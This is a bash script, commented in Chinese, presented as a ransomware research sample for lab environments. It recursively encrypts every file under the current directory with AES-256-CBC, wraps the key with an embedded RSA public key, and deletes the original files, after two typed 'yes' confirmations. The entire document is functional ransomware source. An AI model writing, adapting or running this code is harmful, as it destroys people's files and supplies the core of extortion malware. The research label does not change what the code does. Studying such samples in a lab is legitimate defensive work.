#!/bin/bash

# 勒索软件研究样本 - 仅用于安全研究实验室环境
# 功能：递归加密当前目录及子目录的所有文件

# RSA公钥 (用于加密AES密钥)
RSA_PUBLIC_KEY="-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuPO7GqM4y+K28AgPfUhj
sN3KXudglmbknCx87mHfPPFKQwM4Vd0uWU8Sn1P/aV/Y4vBzQzSjMPRdtnpdp6LF
LsbgndmWNYe3FwVEGdAouIovoK/PieDYKbdVdqPZwmjRsQ7V0lBTSZqX7iZ22kOm
NZJaIzGMsBlu7VUdu0OmiwYgBcr96eOOR5qC0E0JG0+aIDZYRf4J67NhSHDh/DzB
nkhIaVwKlGQpOksPzLN1ILssk6kU+hcWwithuIl3YCDrfRRahQv+AJvNgMjfmaD6
j49aYL+36GH4+2x29fnc2b+mbW0rtHap7Lm64NkaC0wtUhSUNPPSaup3Rwf53vCQ
SQIDAQAB
-----END PUBLIC KEY-----"

# 生成随机AES-256密钥 (32字节)
generate_aes_key() {
    openssl rand -hex 32
}

# 用RSA公钥加密AES密钥
encrypt_aes_key() {
    local aes_key="$1"
    echo "$RSA_PUBLIC_KEY" > ./pubkey.pem
    echo "$aes_key" | openssl rsautl -encrypt -pubin -inkey ./pubkey.pem -pkcs
    rm -f ./pubkey.pem
}

# 加密单个文件
encrypt_file() {
    local file="$1"
    local aes_key="$2"

    # 生成随机IV
    local iv=$(openssl rand -hex 16)

    # 加密文件
    openssl enc -aes-256-cbc -in "$file" -out "${file}.encrypted" -K "$aes_key" -iv "$iv" 2>/dev/null

    if [ $? -eq 0 ]; then
        # 删除原文件
        rm -f "$file"
        echo "[+] Encrypted: $file -> ${file}.encrypted"

        # 保存IV用于解密
        echo "$file:$iv" >> ./iv_map.txt
    fi
}

# 递归遍历目录并加密文件
encrypt_directory() {
    local dir="$1"
    local aes_key="$2"

    # 查找所有文件（排除脚本自身和密钥文件）
    find "$dir" -type f ! -name "*.sh" ! -name "private.pem" ! -name "*.encrypted" ! -name "key.bin" ! -name "iv_map.txt" | while read -r file; do
        encrypt_file "$file" "$aes_key"
    done
}

# 主函数
main() {
    echo "[!] ====================================================="
    echo "[!] 警告：勒索软件研究样本"
    echo "[!] 此脚本将加密当前目录及所有子目录中的文件"
    echo "[!] 仅用于安全研究实验室环境"
    echo "[!] ====================================================="
    echo ""
    echo "[*] 如需继续，请输入: yes"
    echo -n "[?] 您的确认: "

    read -r confirmation

    if [ "$confirmation" != "yes" ]; then
        echo "[-] 确认失败，退出执行"
        exit 1
    fi

        echo "[*] 如需继续，请继续输入: yes"
    echo -n "[?] 您的确认: "

    read -r confirmation

    if [ "$confirmation" != "yes" ]; then
        echo "[-] 确认失败，退出执行"
        exit 1
    fi

    echo ""
    echo "[+] 确认成功，开始加密过程..."

    # 生成随机AES密钥
    AES_KEY=$(generate_aes_key)
    echo "[*] AES密钥: $AES_KEY"

    # 用RSA公钥加密AES密钥并保存
    encrypt_aes_key "$AES_KEY" > ./key.bin
    echo "[+] 加密的AES密钥已保存到 key.bin"

    # 清空IV映射文件
    #rm ./iv_map.txt

    # 递归加密当前目录
    encrypt_directory "./" "$AES_KEY"

    echo "[!] 加密完成！"
    echo "[!] 解密需要使用 private.pem 解密 key.bin 获取AES密钥"
    echo "[!] 然后使用 iv_map.txt 中的IV值解密文件"
}

main
